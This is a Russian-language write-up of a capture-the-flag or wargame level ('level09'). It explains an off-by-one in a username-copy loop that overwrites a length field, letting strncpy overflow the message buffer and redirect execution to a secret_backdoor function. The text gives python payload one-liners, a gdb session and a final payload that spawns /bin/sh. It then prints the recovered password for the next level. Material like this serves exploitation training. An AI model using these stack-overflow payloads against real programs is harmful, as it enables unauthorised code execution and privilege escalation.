
Изучаем псевдокод:

r <<<$(python -c 'print "B"*40+"\xff"+"\n"+"A"*255')
40 букв B, чтобы заполнить логин
xff - (значение 255) следующая итерация цикла.

В функции есть две инициализации массива - user (40 символов) и message (140 символов), а также переменная длины.
В цикле заполнения set_username:
	for (int i = 0; i <= 40; i++) {
		if (stack[16 + i] == 0)
			break ;
		msg->user[i] = stack[16 + i];
	}
Можем увидеть, что заполняется не на 40, а на 41 символов.
Уязвимость заключается в том, что в функции set_msg используется переменная длины, которая не инициализирована.
Используется она при передаче значений из стэка в структуру данных сообщения.
	strncpy(msg->msg, stack + 16, msg->intended_len);
При обычном запуске рандомное значение помогает срабатывать программе как задумано. Но если укоротить значение len,
тогда мы сможем переполнить переменную msg->msg и получить SIGSEV. Переполнить можно, назначив после 
user_name собственное значение в len, т.к. в стеке адреса переменных находятся друг за другом
message
user
len
соответственно, в цикле на 41-ой записи идёт вход на чужую память - память len, которая необходима в set_msg.
Воспользовавшись этим, мы передаём в шестнадцатеричном формате (т.к. записывается в память на стеке) значение,
которое будет присвоено len.
Т.к. идёт одна лишняя операция в цикле, мы записали максимальное значение - 255 - ff (в 16-ой сист. счисления).
Дальше через \n переходим к записи сообщения и забиваем мусором на 255 символов для переполнения, т.к.
ячеек массива для сообщения 140.
В функции backdoor есть ещё один fget, который принимает строку для исполнения через system.
Если сохранение EIP меньше 248 байт после нашего буфера s_message->text (этот двоичный файл 64-битный, поэтому нам нужно 8 байтов для записи адреса), 
мы можем использовать это переполнение 1 байта, чтобы взять под контроль поток выполнения. Буфер начинается с rbp - 0xc0 (192) и есть одно нажатие rbp (8), это означает, 
что сохранение EIP находится в буфере + (192 + 8).

Вписываем также адрес от функции backdoor и комануд, которую нужно запустить через /bin/sh.
Ищем адрес secret_backdoor:

Закидываем мусор 
python -c "print 'A' * 40 + '\xff' + '\n' + 'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%G'" > /tmp/pl
gdb ./level09
r < /tmp/pl
x secret_backdoor
0x55555555488c <secret_backdoor>

Узнав адрес, запускаем наш скрипт с мусором и запуском функции backdoor с аргументами баш.
(python -c "print 'A' * 40 + '\xff' + '\n' + 'A' * 200  + '\x8c\x48\x55\x55\x55\x55\x00\x00' + '/bin/sh'" ; cat) | ./level09

cat /home/users/end/.pass         
j4AunAPDXaJxxWjYEUxpanmvSgRDV3tpA5BEaBuE

su end